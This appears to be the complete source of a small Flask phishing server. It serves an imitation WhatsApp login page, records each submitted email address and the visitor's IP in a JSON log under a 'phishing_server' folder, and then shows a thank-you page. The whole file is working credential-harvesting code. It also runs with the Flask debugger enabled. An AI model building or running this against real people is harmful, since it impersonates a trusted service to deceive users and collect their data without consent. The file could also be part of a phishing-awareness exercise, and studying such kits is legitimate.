
from flask import Flask, render_template, request
from datetime import datetime
import os
import json

app = Flask(__name__)

LOG_FILE = "phishing_server/logs/attempts.json"

def log_attempt(email, source_ip):
    timestamp = datetime.now().isoformat()
    log_entry = {
        "email": email,
        "ip": source_ip,
        "timestamp": timestamp
    }
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            json.dump([], f)

    with open(LOG_FILE, "r+") as f:
        data = json.load(f)
        data.append(log_entry)
        f.seek(0)
        json.dump(data, f, indent=4)

@app.route("/")
def index():
    return render_template("whatsapp_login.html")

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    source_ip = request.remote_addr
    log_attempt(email, source_ip)
    return render_template("thankyou.html")

if __name__ == "__main__":
    app.run(debug=True)
